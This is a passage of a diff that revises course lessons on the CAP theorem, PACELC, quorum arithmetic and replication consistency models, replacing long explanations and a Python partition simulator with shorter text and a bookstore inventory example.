-- GitHub implementation: [Jepsen](https://github.com/jepsen-io/jepsen) itself, [etcd](https://github.com/etcd-io/etcd) as a deliberately CP system, and [Cassandra](https://github.com/apache/cassandra) as a deliberately AP one with per-query tunable consistency, which is the best way to feel the trade-off as a dial rather than a category
-- Practice platform: [MIT 6.5840's labs](https://pdos.csail.mit.edu/6.824/) have you build a fault-tolerant key-value store and see exactly where the trade-off becomes unavoidable. [Fly.io's distributed systems challenge](https://fly.io/dist-sys/), built on Jepsen's Maelstrom, is free, hands-on, and the single best practice available for this material
+- **Consistency (linearizability):** the system behaves as if there is a single copy of the data; every operation happens at one instant; any read returns the most recently completed write.
+- **Availability:** every request to a non-failed node eventually receives a non-error response.
+- **Partition tolerance:** the system continues to operate despite arbitrary message loss between nodes.
 
-**STEP-BY-STEP EXPLANATION**
+Most popular restatements are sloppy. Precision matters because “consistent enough” and “available enough” are how people talk themselves into believing they escaped the theorem.
 
-The theorem is precise, and most of the confusion around it comes from imprecision in the popular restatement. The formal result, proved by Gilbert and Lynch, concerns three properties. **Consistency** here means *linearizability*, which is a strong and specific guarantee: the system behaves as if there is a single copy of the data and every operation happens at a single instant, so any read returns the most recently completed write. Note that this is a different and much stronger meaning than the C in ACID from Phase 64, which is about integrity constraints, and conflating the two is a common error. **Availability** means every request to a non-failed node receives a non-error response, eventually. **Partition tolerance** means the system continues to operate despite arbitrary messages being dropped between nodes.
+**YOU DO NOT “PICK TWO OF THREE”:**
 
-The single most important clarification is that **you do not get to choose two out of three**. Partitions are not a design decision, they are something the physical world does to you: cables get cut, switches fail, routes flap, and a sufficiently long delay is indistinguishable from a partition. Since P is compulsory for any system spread across a network, the theorem reduces to a conditional statement about what happens *during* a partition, and the choice is between C and A only in that window. A system that is described as "CA" is really a system that has decided partitions do not happen, which means it is a single node or it will behave incorrectly when the network misbehaves.
+Partitions are not a product feature you enable. Cables get cut, switches fail, routes flap, and a sufficiently long delay is indistinguishable from a partition. **P is compulsory** for any system spread across a network. The theorem is a conditional about the partition window: choose C or A *then*. A system marketed as “CA” is really a single node — or a system that will be wrong when the network misbehaves.
 
-The proof is short enough to reconstruct from scratch, and doing so is what makes the result feel inevitable rather than memorised. Take two nodes holding the same value, and cut the link between them. A client writes a new value to node one. A different client immediately reads from node two. Node two has exactly two options and there is no third. It can return the old value, which is a successful response containing stale data, so the system chose availability and gave up linearizability. Or it can refuse to answer until it can confirm with node one, which is impossible while the partition lasts, so the system chose consistency and gave up availability. No cleverness in the implementation creates a third option, because the information simply has not crossed the gap.
-
-**PACELC** is the extension that makes the theorem practically useful, and it is worth knowing because it covers the case that actually dominates your operating time. It states: if there is a **P**artition, choose between **A**vailability and **C**onsistency; **E**lse, in normal operation, choose between **L**atency and **C**onsistency. That second clause is the one that matters day to day, because partitions are rare while every single request pays the latency cost of whatever coordination your consistency level requires. A quorum read across three regions costs a cross-region round trip on every read, forever, partition or not. This reframes the design question from "what do I do in a disaster" to "what am I paying continuously," which is usually the more consequential trade-off.
-
-The other refinement worth carrying is that **consistency is a dial rather than a switch**, and modern systems expose it as one. Cassandra lets you specify per query how many replicas must acknowledge a write and how many must respond to a read, and the rule that governs correctness is arithmetic: if the write quorum plus the read quorum exceeds the total replica count, then any read set and any write set must overlap by at least one node, so the read sees the latest write. With three replicas, requiring two acknowledgements on write and two on read gives you strong consistency, while requiring one of each gives you fast, eventually consistent operation, on the same data, chosen per operation. That means the real design activity is not labelling your database CP or AP but deciding, per operation, what each one needs, and it is entirely normal for one system to want linearizable writes for account balances and eventually consistent reads for a view counter.
-
-Finally, the practical judgment. Choose consistency when a stale or conflicting answer causes real harm that cannot be reconciled afterwards: financial ledgers, inventory that cannot be oversold, unique username registration, distributed locks, and anything where two conflicting decisions cannot both be honoured. Choose availability when staleness is briefly tolerable and reconciliation is possible: feeds, view counts, likes, recommendations, caches, and analytics. The strongest instinct to develop is asking what the business cost of each failure actually is, because "the number was three seconds out of date" and "we sold the same seat twice" are not comparable, and it is the comparison rather than the theorem that decides the design.
-
-**PICTURE IT LIKE THIS**
-
-Two bank branches, connected by a line that's just gone down, both need to answer "what's this customer's balance?" Branch A can either (1) refuse to answer until the line is restored, guaranteeing it never gives a wrong number (consistency over availability), or (2) answer with its last-known balance, risking it's now stale if the other branch processed a transaction the line didn't relay yet (availability over consistency). There is no third option that's both instantly available and guaranteed fresh while the line is down.
-
-**Internal Working, the proof in six steps**
+**THE PROOF YOU SHOULD BE ABLE TO RECONSTRUCT:**
 
 ```text
 Two nodes, one value, replicated. A cable is cut.
@@ -17673,798 +14363,222 @@ Two nodes, one value, replicated. A cable is cut.
 
   1. client A writes v = "new" to node 1
   2. node 1 tries to replicate to node 2 ......... message lost
-  3. client B reads from node 2, RIGHT NOW
-  4. node 2 must answer. It has exactly two options:
+  3. client B reads from node 2 RIGHT NOW
+  4. node 2 has exactly two options:
 
-     OPTION A (choose Availability)
-         return "old"
-         -> the client got a fast, successful response
-         -> the response is WRONG: a later read returned an
-            earlier value than a completed write
-         -> linearizability is violated
+     OPTION A (Availability):
+         return "old" — successful, possibly wrong vs completed write
+         → linearizability broken
 
-     OPTION B (choose Consistency)
-         refuse: "I cannot confirm this is current"
-         -> the answer is never wrong
-         -> the system is UNAVAILABLE for this read until the
-            partition heals
-         -> and node 2 cannot know how long that will be
+     OPTION B (Consistency):
+         refuse until it can confirm with node 1 — impossible while cut
+         → unavailable for this read until the partition heals
 
-  5. There is no option C. The bytes describing "new" have not
-     crossed the gap. No algorithm creates information that has
-     not arrived.
+  5. No option C. The bytes for "new" have not crossed the gap.
+     No algorithm creates information that has not arrived.
 
   6. Therefore: during a partition, C and A cannot both hold.
 
-  Note what the theorem does NOT say:
-     * it says nothing about behaviour when the network is healthy
-     * "pick 2 of 3" is a misstatement -- P is not optional, the
-       physical network decides that
-     * a "CA system" is a single node, or a system that will be
-       wrong when the network misbehaves
+  What the theorem does NOT say:
+     * nothing about behaviour when the network is healthy
+     * "pick 2 of 3" is a misstatement — P is not optional
+     * a "CA system" is a single node, or wrong under partition
 ```
 
-**Internal Working, quorums make consistency a dial**
+Two bank branches with the line down, both asked for a balance: refuse until the line returns (C over A), or answer with last-known and risk staleness (A over C). There is no third option that is both instantly available and guaranteed fresh while the line is down.
+
+**BOOKSTORE INVENTORY DURING A PARTITION:**
 
 ```text
-N = 3 replicas.  W = replicas that must ack a write.
-                 R = replicas that must answer a read.
+Warehouse node W and Storefront node S lose contact.
+Customer buys the last copy of Dune on S.
+Warehouse staff adjusts stock on W for a damaged return.
 
-THE RULE:   W + R > N  =>  the read set and write set MUST overlap
-                           in at least one node  =>  the read sees
-                           the latest write.
+AP choice: both sides accept writes → oversell / negative stock later → reconcile.
+CP choice: minority side refuses writes → lost sales during the outage → no silent conflict.
 
-  W=1, R=1   (1+1=2, NOT > 3)   FAST, eventually consistent
-      write ->  [n1*] [n2 ] [n3 ]        only n1 has it
-      read  <-        [n2 ]              STALE. legal. by design.
-      latency: one node. survives 2 failures. AP.
-
-  W=2, R=2   (2+2=4 > 3)         STRONGLY consistent
-      write ->  [n1*] [n2*] [n3 ]        2 acked
-      read  <-        [n2*] [n3 ]        n2 is in both sets -> fresh
-      latency: the slower of two nodes. survives 1 failure. CP.
-
-  W=3, R=1   (3+1=4 > 3)         fast reads, fragile writes
-      every write must reach all three: ANY node down blocks writes
-      good for read-heavy data that changes rarely
-
-  W=1, R=3   (1+3=4 > 3)         fast writes, fragile reads
-      the mirror image
-
-DURING A PARTITION with W=2, R=2 and a 2/1 split:
-      majority side (2 nodes): can still reach W=2 -> keeps serving
-      minority side (1 node):  cannot reach 2      -> unavailable
-  This is exactly the majority-quorum idea in Phase 86, and it is
-  why "CP" in practice means "the minority side stops."
-
-AND THE SAME SYSTEM CAN DO BOTH, per query:
-      SELECT balance ... CONSISTENCY QUORUM     -- money
-      SELECT views   ... CONSISTENCY ONE        -- a counter
-  Which is why labelling a database "CP" or "AP" is usually too
-  coarse to be a useful statement about your application.
+Neither is free. The business cost decides: "sold the same book twice"
+is not the same as "recommendation widget was three seconds stale."
 ```
 
-**Internal Working, PACELC, the part that governs every normal day**
+Practical judgment: choose consistency when a stale or conflicting answer causes harm that cannot be reconciled — ledgers, inventory that cannot oversell, unique username registration, distributed locks. Choose availability when staleness is briefly tolerable and reconciliation is possible — feeds, view counts, likes, recommendations, caches, analytics.
+
+**PACELC — THE CLAUSE YOU PAY EVERY DAY:**
+
+CAP is about the rare emergency. **PACELC** adds: if Partition, choose A or C; **Else** (normal operation), choose **Latency** or **Consistency**. That second clause dominates operating time. Quorum reads across three regions cost a cross-region round trip on *every* healthy read, forever. Designing only for the disaster and ignoring the permanent latency bill is the common mistake.
 
 ```text
                    is there a Partition?
                     /                  \
-                 YES                    NO  (99.9%+ of the time)
+                 YES                    NO  (most of the time)
                   |                      |
           Availability                Latency
               or                          or
           Consistency                Consistency
 
-  THE ELSE BRANCH IS THE ONE YOU PAY FOR CONTINUOUSLY.
-
   Three replicas in three regions, quorum reads:
       same region        ~1 ms
-      cross-region       ~70 ms   <- EVERY read, forever, healthy
-                                     network or not
-      a quorum read must wait for the 2nd fastest of 3
-      -> your p50 read latency is now a geography problem
-
-  Systems classified by both clauses:
-      PC/EC   etcd, ZooKeeper, Spanner    consistency always, pay
-                                          latency for it always
-      PA/EL   Cassandra, DynamoDB(default), Riak
-                                          availability and low
-                                          latency, staleness allowed
-      PA/EC   MongoDB (default config)    available under partition,
-                                          consistent when healthy
-      PC/EL   PNUTS                       rare and interesting
-
-  Partitions are the rare emergency. Latency is the permanent bill.
-  Designing only for the first is the common mistake.
+      cross-region       ~70 ms   ← EVERY read, forever, healthy network or not
+      a quorum read waits for the 2nd fastest of 3
+      → your p50 read latency becomes a geography problem
 ```
 
-**WHAT YOU GAIN, WHAT IT COSTS, AND WHERE IT CAN FAIL**
+| Shape | Partition behavior | Else (healthy) | Examples (typical configs) |
+| ----- | ------------------ | -------------- | -------------------------- |
+| PC/EC | prefer C | prefer C (pay latency) | etcd, ZooKeeper, Spanner-like |
+| PA/EL | prefer A | prefer low latency | Cassandra/Dynamo-style defaults |
+| PA/EC | prefer A under partition | prefer C when healthy | some MongoDB defaults |
+| PC/EL | prefer C under partition | prefer low latency when healthy | rare / interesting |
 
+Do not memorize vendor logos as destiny — configs change. Use the labels to ask *which bill you are paying*.
 
-| Choice during a partition | What you get                                | What you lose                                                   | Correct for                                                |
-| ------------------------- | ------------------------------------------- | --------------------------------------------------------------- | ---------------------------------------------------------- |
-| Consistency (CP)          | never a wrong answer, single-copy semantics | the minority side returns errors until it heals                 | balances, inventory, unique names, locks, leader election  |
-| Availability (AP)         | every node answers, always                  | reads may be stale, writes may conflict and need reconciliation | feeds, counters, likes, recommendations, caches, telemetry |
+**CONSISTENCY AS A DIAL (BRIDGE INTO 85.2):**
 
+Modern systems often expose consistency **per operation**. With N replicas, if write quorum W plus read quorum R exceeds N, read and write sets must overlap — the read sees the latest write. Same cluster: linearizable balance updates, eventual view counters. Labelling an entire database “CP” or “AP” is usually too coarse for the bookstore.
 
-
-| Consistency level                    | Read latency                               | Availability              | Staleness                                    | Cost                               |
-| ------------------------------------ | ------------------------------------------ | ------------------------- | -------------------------------------------- | ---------------------------------- |
-| Linearizable, `W+R>N` across regions | cross-region round trip on every operation | minority side unavailable | none                                         | highest, paid continuously         |
-| Quorum within one region             | single-region round trip                   | survives one node         | none within the region                       | moderate                           |
-| Read your own writes                 | local, plus leader stickiness              | high                      | others may see stale                         | low, and usually enough            |
-| Eventual, `W=1, R=1`                 | single node, fastest possible              | survives most failures    | unbounded in principle, usually milliseconds | lowest                             |
-| Causal                               | local, with dependency tracking            | high                      | causally related operations are ordered      | moderate, and often the sweet spot |
-
-
-The trade-off people miss is that these are not five system architectures, they are five settings available in one system, frequently per query. The engineering work is therefore classifying your operations rather than classifying your database. A realistic application has a handful of operations that genuinely require linearizability, usually involving money, uniqueness, or exclusive locks, and a large majority that are perfectly served by eventual consistency, and paying for the strongest guarantee across all of them is the most common way to make a system needlessly slow.
-
-**SMALL WORKING EXAMPLE**
-
-```python
-# ---------------------------------------------------------------
-# A three-replica store where the partition is something you can
-# actually trigger, so the theorem becomes an experiment rather
-# than an assertion.
-# ---------------------------------------------------------------
-import time
-from dataclasses import dataclass, field
-
-@dataclass
-class Node:
-    name: str
-    data: dict[str, tuple[str, int]] = field(default_factory=dict)  # value, version
-    reachable: set[str] = field(default_factory=set)
-    up: bool = True
-
-class Cluster:
-    def __init__(self, n=3):
-        self.nodes = {f"n{i}": Node(f"n{i}") for i in range(1, n + 1)}
-        self.heal()
-        self.clock = 0
-
-    def heal(self):
-        for node in self.nodes.values():
-            node.reachable = set(self.nodes) - {node.name}
-
-    def partition(self, side_a: set[str], side_b: set[str]):
-        """Cut every link between the two sides. This is the physical
-        world acting on you, not a configuration choice."""
-        for name in side_a:
-            self.nodes[name].reachable -= side_b
-        for name in side_b:
-            self.nodes[name].reachable -= side_a
-
-    def _peers(self, coordinator):
-        node = self.nodes[coordinator]
-        return [coordinator] + [p for p in node.reachable if self.nodes[p].up]
-
-    def write(self, coordinator, key, value, W):
-        """Return (ok, acks). Fails if W replicas cannot be reached."""
-        self.clock += 1
-        available = self._peers(coordinator)
-        if len(available) < W:
-            # CONSISTENCY chosen: refuse rather than accept a write
-            # the required number of replicas cannot confirm.
-            return False, len(available)
-        for name in available[:max(W, 1)]:
-            self.nodes[name].data[key] = (value, self.clock)
-        return True, min(len(available), W)
-
-    def read(self, coordinator, key, R):
-        """Return (ok, value). Reads R replicas and takes the newest."""
-        available = self._peers(coordinator)
-        if len(available) < R:
-            return False, None                  # unavailable, by choice
-        seen = [self.nodes[n].data.get(key) for n in available[:R]]
-        seen = [s for s in seen if s]
-        if not seen:
-            return True, None
-        return True, max(seen, key=lambda vv: vv[1])[0]
-
-def demo(W, R, label):
-    N = 3
-    print(f"\n=== {label}:  N={N} W={W} R={R}   "
-          f"W+R={W+R} {'>' if W+R > N else '<='} N  ->  "
-          f"{'STRONG' if W + R > N else 'EVENTUAL'} ===")
-    c = Cluster(N)
-    c.write("n1", "balance", "100", W)
-
-    # Healthy network: everything works either way.
-    print("  healthy   write 'new':", c.write("n1", "balance", "new", W))
-    print("  healthy   read       :", c.read("n3", "balance", R))
-
-    # Now cut the network: {n1, n2} on one side, {n3} alone.
-    c = Cluster(N)
-    c.write("n1", "balance", "100", W)
-    c.partition({"n1", "n2"}, {"n3"})
-    print("  -- partition: {n1,n2} | {n3} --")
-
-    ok, acks = c.write("n1", "balance", "999", W)
-    print(f"  majority  write '999': ok={ok} acks={acks}")
-    print(f"  majority  read       : {c.read('n2', 'balance', R)}")
-    ok, value = c.read("n3", "balance", R)
-    if not ok:
-        print("  minority  read       : REFUSED  <- chose CONSISTENCY,")
-        print("                                     gave up availability")
-    else:
-        print(f"  minority  read       : ok, value={value!r}  <- chose")
-        print("                                     AVAILABILITY, and the")
-        print("                                     value is now STALE")
-
-demo(W=1, R=1, label="AP  (Cassandra CONSISTENCY ONE)")
-demo(W=2, R=2, label="CP  (quorum, etcd-like)")
-# Same code, same partition, opposite behaviour. The only difference
-# is two integers, which is the point: consistency is a dial.
-
-# ---------------------------------------------------------------
-# Read-your-own-writes, which is what most applications actually
-# need and is far cheaper than linearizability.
-# ---------------------------------------------------------------
-class SessionRouter:
-    """After a user writes, pin THEIR reads to the leader briefly.
-    Everyone else keeps reading cheap, slightly stale replicas."""
-    def __init__(self, lag_budget_s=2.0):
-        self.last_write: dict[str, float] = {}
-        self.lag_budget = lag_budget_s
-
-    def on_write(self, user_id):
-        self.last_write[user_id] = time.time()
-
-    def route_read(self, user_id):
-        written = self.last_write.get(user_id, 0)
-        if time.time() - written < self.lag_budget:
-            return "leader"        # this user must see their own write
-        return "replica"           # everyone else: cheap and stale is fine
-
-r = SessionRouter()
-print("\nbefore writing, user reads from:", r.route_read("u1"))
-r.on_write("u1")
-print("just after writing, reads from :", r.route_read("u1"))
-print("a different user still reads   :", r.route_read("u2"))
-# This is the pragmatic answer to most consistency complaints, and it
-# costs one timestamp per session rather than a cross-region quorum.
-
-# ---------------------------------------------------------------
-# Classify your OPERATIONS, not your database. This is the actual
-# design activity the theorem implies.
-# ---------------------------------------------------------------
-OPERATIONS = {
-    "transfer money":        ("linearizable", "two conflicting transfers cannot both be honoured"),
-    "reserve last seat":     ("linearizable", "double-selling is unrecoverable"),
-    "register username":     ("linearizable", "uniqueness is the whole point"),
-    "acquire a lock":        ("linearizable", "two holders defeats the lock"),
-    "read own profile":      ("read-your-writes", "user must see their own edit"),
-    "post a comment":        ("causal", "replies must not appear before the post"),
-    "increment view count":  ("eventual", "off by three for a second is free"),
-    "load recommendations":  ("eventual", "staleness is invisible"),
-    "read analytics":        ("eventual", "aggregates converge"),
-}
-print()
-for op, (level, why) in OPERATIONS.items():
-    print(f"  {op:<22} {level:<18} {why}")
+```text
+N=3  W=2 R=2  (W+R>N)  → strong; minority side of a 2/1 split stops
+N=3  W=1 R=1  (not >N) → fast; stale reads legal by design
 ```
 
-```bash
-# Trigger a real partition against a real cluster. This is the
-# experiment that makes the theorem stop being abstract.
-docker compose up -d          # a 3-node etcd or Cassandra cluster
+**PRACTICE:**
 
-# Sever one node from the other two:
-docker network disconnect mynet node3
-#   etcd (CP):        node3 refuses reads and writes; the other two
-#                     elect a leader and keep serving
-#   Cassandra (AP):   node3 keeps answering with stale data at
-#                     CONSISTENCY ONE, and refuses at QUORUM
+| Difficulty | Task |
+| ---------- | ---- |
+| Easy | State CAP in one sentence that mentions *during a partition*; say why “pick 2 of 3” is misleading |
+| Medium | Give a two-node partition example for bookstore stock; argue CP vs AP with a business cost |
+| Medium | Explain CAP C ≠ ACID C in two sentences |
+| Hard | Using PACELC, explain why cross-region quorum reads hurt p50 even when the network is healthy |
 
-# Or shape the network instead of cutting it, which is closer to
-# what production failures look like:
-tc qdisc add dev eth0 root netem delay 500ms loss 30%
-# a long enough delay is INDISTINGUISHABLE from a partition, which
-# is why timeouts are the hardest number to choose in this whole phase
+**WHAT THIS UNLOCKS NEXT:**
 
-docker network connect mynet node3     # heal, then check for conflicts
-```
+CAP tells you the emergency trade-off. Day-to-day you still need vocabulary for what “replica lag,” “read your own writes,” and “eventual consistency” mean when the bookstore serves from multiple copies. That consistency-model toolkit is lesson 85.2.
 
-**HOW TO EXPLAIN THIS IN AN INTERVIEW**
+---
 
-"Design a system that needs to survive a network partition - would you prioritize consistency or availability, and why" is a direct CAP theorem application question. The correct answer depends entirely on the specific system: a bank balance often leans consistency (better to be unavailable than wrong); a social media "like" counter often leans availability (better to show a slightly stale number than show an error page). The follow-up that distinguishes a memorised answer is "can you have a CA system," where the expected reasoning is that partition tolerance is not a choice because the network decides, so a CA system is a single node. Expect "does the C in CAP mean the same thing as the C in ACID," which is a deliberate trap: CAP's C is linearizability while ACID's C is integrity constraints, and they are unrelated. A strong candidate also volunteers that CAP describes only the partition window and brings up PACELC unprompted, since the latency-versus-consistency choice is paid on every request and therefore matters more in practice. Expect "explain the quorum arithmetic," where `W + R > N` and the overlap argument is the answer, and "which parts of the system you just designed need strong consistency," which is the real question hiding inside all of the others, because the expected answer classifies individual operations rather than the whole system.
+> **Continue:** [85.2 Replication & Consistency Models](#phase-85)
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
-
-
-| Difficulty | Task                                                                                                                                                                                     |
-| ---------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Easy       | Reconstruct the two-node proof from scratch on paper without looking at it                                                                                                               |
-| Easy       | Explain why "pick two of three" is a misstatement of the theorem                                                                                                                         |
-| Easy       | Explain the difference between the C in CAP and the C in ACID                                                                                                                            |
-| Easy       | For N equals 5, list every pair of W and R that gives strong consistency                                                                                                                 |
-| Easy       | Classify ten operations from an application you use as needing linearizable, causal, read-your-writes, or eventual consistency                                                           |
-| Medium     | Run the code above and explain, line by line, why the same partition produces opposite behaviour at different W and R                                                                    |
-| Medium     | Bring up a three-node etcd cluster, partition one node with Docker networking, and record exactly what the majority and minority sides do                                                |
-| Medium     | Do the same against Cassandra at `CONSISTENCY ONE` and then at `QUORUM`, and explain the difference you observed                                                                         |
-| Medium     | Implement read-your-own-writes with leader stickiness and demonstrate that it fixes the bug while other users still read replicas                                                        |
-| Medium     | Measure the real latency cost of a quorum read versus a single-node read, then explain the result in PACELC terms                                                                        |
-| Medium     | Use `tc netem` to add 500 ms of delay rather than cutting the link, and explain why a timeout cannot distinguish this from a partition                                                   |
-| Medium     | Look up the default consistency configuration of a database you use in production and write down which PACELC category it falls in                                                       |
-| Hard       | Complete the [Fly.io distributed systems challenge](https://fly.io/dist-sys/) through the broadcast and counter problems, and write down where the trade-off became unavoidable          |
-| Hard       | Read a [Jepsen analysis](https://jepsen.io/analyses) of a database you use and summarise which guarantee it violated and under what conditions                                           |
-| Hard       | Implement a last-write-wins conflict resolution for an AP store, then demonstrate a case where it silently loses a write, and fix that case with vector clocks or a CRDT                 |
-| Hard       | Design a system with both requirements: linearizable account balances and eventually consistent activity feeds. Specify the storage and consistency level for each and justify the split |
-| Hard       | Read [Kleppmann's critique of the CAP theorem](https://arxiv.org/abs/1509.05393) and write down the three specific imprecisions it identifies                                            |
-| Hard       | Build a partition-testing harness for your own service that cuts the network, records every response, and asserts which guarantees held                                                  |
-
-
-**WHY THE NEXT TOPIC IS NEEDED - Worked System Design:** The theorem tells you which trade-off exists and the stages tell you which tools are available. Neither tells you how to combine them under the pressure of a real, ambiguous requirement in forty-five minutes, which is a distinct skill and is best learned by walking complete examples end to end.
+---
 
 ## 85.2 Replication & Consistency Models, Revisited
 
-**WHY YOU ARE LEARNING THIS:** Phase 65 introduced replication as a scaling technique and named replication lag as its cost. Phase 85 established that during a partition you must choose between consistency and availability. Both left the same gap: they described the trade-off without giving the application anything it can reason about. "Eventually consistent" is not a specification, because "eventually" is not a number and "consistent" without qualification does not say which anomalies are possible. An engineer who knows only that the replica might be stale cannot answer the question that actually matters, which is whether a specific piece of code is correct. Named consistency models exist because the previous limitation was not a lack of mechanisms but a lack of vocabulary precise enough to check anything against.
+Lesson 85.1 made the partition limit inevitable. This lesson owns the **models you use when the network is mostly fine** — the language of replication lag, session guarantees, and quorum arithmetic. Phase 65 already showed *how* to run replicas and shards. Here you ask *what readers are allowed to observe*.
 
-**Why this needs its own phase, beyond Phase 65 and Phase 81:** Earlier phases named replication as a scaling technique and flagged "replication lag" as a cost. This phase asks the harder question those earlier mentions glossed over: *exactly* how stale can a replica be, and what specific guarantee (if any) does an application get about what it will read?
+**WHY MODELS BECOME NECESSARY NOW:**
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+Once you have a primary plus replicas (Phase 65) or an AP store that accepts concurrent writes, “the database” is no longer one timeline. A customer who updates their shipping address and immediately refreshes may hit a lagging replica and see the old address — **read-your-own-writes** violated. A feed that jumps backward in time violates **monotonic reads**. These are not CAP corner cases; they are everyday replica physics.
 
-- Best animated explanation: [Data Consistency | Strong vs Eventual Consistency (Shiran Afergan)](https://www.youtube.com/watch?v=WZqGS-wczaY) *(Composio YouTube)* and [Data Consistency and Tradeoffs in Distributed Systems (Gaurav Sen)](https://www.youtube.com/watch?v=m4q7VkgDWrM) *(Composio YouTube; replaced dead IDs)* - the second builds the anomalies up one at a time from a two-replica example, which is the only way this material becomes intuitive rather than a glossary
-- Alternative: [Distributed Systems in One Lesson (Tim Berglund)](https://www.youtube.com/watch?v=Y6Ev8GIlbxc) uses a coffee shop comparison to introduce the whole subject. [Consistency Models (Martin Kleppmann, Cambridge lecture 6)](https://www.youtube.com/watch?v=noUNH3jDLC0) then gives the careful technical treatment from the author of the standard text.
-- Another angle: [CRDTs and the Quest for Distributed Consistency (Martin Kleppmann)](https://www.youtube.com/watch?v=B5NULPSiOGw) explains the data structures that make eventual consistency *safe* by making conflicts impossible rather than merely resolvable, which is the most practically useful idea in this section
-- Interactive simulator: [Jepsen's consistency model map](https://jepsen.io/consistency) is an interactive diagram of every model and exactly which implies which, and it is the single best reference for this topic. For hands-on work, [Fly.io's distributed systems challenge](https://fly.io/dist-sys/) has you implement a broadcast system and then a counter, and you will observe each anomaly personally. Locally, start a Postgres primary with two replicas, add artificial lag with `tc netem`, and write a loop that writes then immediately reads from a replica so you can watch read-your-own-writes fail in front of you
-- Written documentation: [Jepsen's consistency models](https://jepsen.io/consistency) with a page per model, [Designing Data-Intensive Applications](https://dataintensive.net/) chapter 5 and 9 which is the definitive treatment, [Kleppmann's "Please stop calling databases CP or AP"](https://martin.kleppmann.com/2015/05/11/please-stop-calling-databases-cp-or-ap.html), and [Werner Vogels on eventual consistency](https://www.allthingsdistributed.com/2008/12/eventually_consistent.html) which is the paper that introduced the session guarantees by name
-- GitHub implementation: [Automerge](https://github.com/automerge/automerge) and [Yjs](https://github.com/yjs/yjs) are production CRDT libraries and reading their merge functions is the clearest possible explanation of convergence, [Riak](https://github.com/basho/riak) for vector clocks in a real database, and [Maelstrom](https://github.com/jepsen-io/maelstrom) for testing your own implementations against real anomaly checkers
-- Practice platform: [Fly.io's distributed systems challenge](https://fly.io/dist-sys/) is free and outstanding, and [MIT 6.5840's labs](https://pdos.csail.mit.edu/6.824/) build a linearizable key-value store from scratch, which is the most thorough practice available anywhere
+**COMMON MODELS (STRONGER → WEAKER — INTUITION, NOT A TAXONOMY EXAM):**
 
-**STEP-BY-STEP EXPLANATION**
+| Model | Promise (intuition) | Typical cost |
+| ----- | ------------------- | ------------ |
+| **Linearizability** | Single-copy semantics; operations appear at one instant | Coordination / quorums; higher latency |
+| **Sequential consistency** | Same order for all viewers, not necessarily wall-clock real-time | Still strong; subtle gap vs linearizability |
+| **Causal consistency** | If A happened-before B, everyone sees A before B | Track dependencies; often a sweet spot |
+| **Read-your-own-writes** | A client sees its own updates | Session stickiness or version tokens |
+| **Monotonic reads** | A client never goes backward in time | Track high-water mark |
+| **Eventual consistency** | If writes stop, replicas converge | Fast; conflicts need merge/reconcile |
 
-Consistency models form a hierarchy, and each one is defined by exactly which anomalies it forbids. Working from strongest to weakest makes the structure clear, and the important insight is that each step down buys latency and availability by permitting one more class of surprising behaviour.
-
-**Linearizability** is the strongest single-object model. It means the system behaves as though there is one copy of the data and every operation takes effect at a single instant somewhere between its invocation and its response, so any read observes the most recently completed write, from anyone. This is what "strong consistency" usually means and it is what makes distributed systems reason like single-threaded ones. It requires coordination on every operation, which means a cross-region deployment pays a cross-region round trip continuously, and during a partition the minority side must stop serving.
-
-**Sequential consistency** relaxes the real-time requirement: all nodes see all operations in the same order, but that order need not match the wall-clock order in which they occurred. **Causal consistency** relaxes further and is the most interesting point on the spectrum, because it preserves exactly the ordering that humans notice. Operations that are causally related, meaning one could have influenced the other, are seen in the same order by everyone, while genuinely concurrent operations may be seen in different orders. This is enough to prevent a reply appearing before the message it replies to, which is the anomaly users actually complain about, and it is achievable without global coordination, which is why it is often the correct target.
-
-Below causal consistency sit the four **session guarantees**, which are weaker in the abstract but frequently sufficient in practice because they scope the guarantee to one user's experience. **Read your own writes** means a user always sees their own updates, and it fixes the single most common complaint about replicated systems, where you edit your profile and the page reloads showing the old value. **Monotonic reads** means you never see time move backwards, so refreshing a page cannot show older data than the previous load, which happens when successive requests hit different replicas with different lag. **Writes follow reads** means if you read a value and then write based on it, everyone sees them in that order. **Monotonic writes** means your own writes are applied in the order you issued them. These four are cheap, usually implemented with per-session routing or version tokens, and they resolve most user-visible weirdness without any global coordination.
-
-**Eventual consistency** is the weakest useful guarantee: if writes stop, all replicas converge. It says nothing about how long, nothing about what you see in the meantime, and nothing about ordering. It is genuinely appropriate for a great deal of data, and the honest framing is that it is a *liveness* property with no accompanying *safety* property, which is why building on it requires either accepting anomalies or adding the session guarantees above.
-
-The mechanical question underneath all of this is **how conflicting writes are detected and resolved**, because with more than one writable replica two clients can concurrently write the same key. **Last write wins** using timestamps is the simplest approach and it silently discards data, which is acceptable for a cache and unacceptable for a shopping cart. **Vector clocks** solve the detection problem properly: each replica maintains a counter per node, and comparing two vectors tells you whether one causally precedes the other or whether they are genuinely concurrent, at which point the system can surface the conflict rather than guess. **CRDTs**, conflict-free replicated data types, take the more elegant route of designing the data structure so that merging is commutative, associative, and idempotent, which makes conflicts mathematically impossible rather than merely detectable. A grow-only counter, an add-only set, and the text sequences that power collaborative editors are all CRDTs, and the reason they matter is that they let you have availability and convergence with no coordination and no lost data, at the cost of only supporting operations that can be made to commute.
-
-The final practical point is that **consistency is chosen per operation, not per system**, which mirrors the quorum discussion in Phase 85. A single application legitimately wants linearizability for account balances, causal consistency for comment threads, read-your-own-writes for profile edits, and bare eventual consistency for view counters. Designing the whole system to the strongest requirement any part of it has is the most common way to make a distributed system needlessly slow.
-
-**BEFORE VS. AFTER**
+**QUORUM ARITHMETIC — THE DIAL MADE CONCRETE:**
 
 ```text
-"Eventual consistency" (the loose guarantee many earlier mentions implied)
-        Problem: "eventually" is not a number -- an application can't
-        reason about correctness if the staleness window is unbounded
-        and unspecified.
+N = 3 replicas.  W = replicas that must ack a write.
+                 R = replicas that must answer a read.
 
-Named consistency models, each a specific, checkable guarantee:
-  - Strong consistency: every read sees the latest write, always
-    (expensive -- effectively requires coordinating with every replica
-    on every read, which reintroduces the single-point-of-failure
-    problem replication was meant to solve).
-  - Read-your-own-writes: a user is guaranteed to see THEIR OWN recent
-    writes immediately, even if other users might briefly see stale data.
-  - Eventual consistency: given enough time with no new writes, all
-    replicas WILL converge to the same value -- but with no fixed bound
-    on how long "eventually" takes.
-        Trade-off: each stronger guarantee costs more coordination
-        (latency, availability under partition -- directly the CAP
-        theorem from Phase 85) than the guarantee below it.
+RULE:  W + R > N  ⇒  read set and write set MUST overlap
+                     ⇒  read can see the latest write.
+
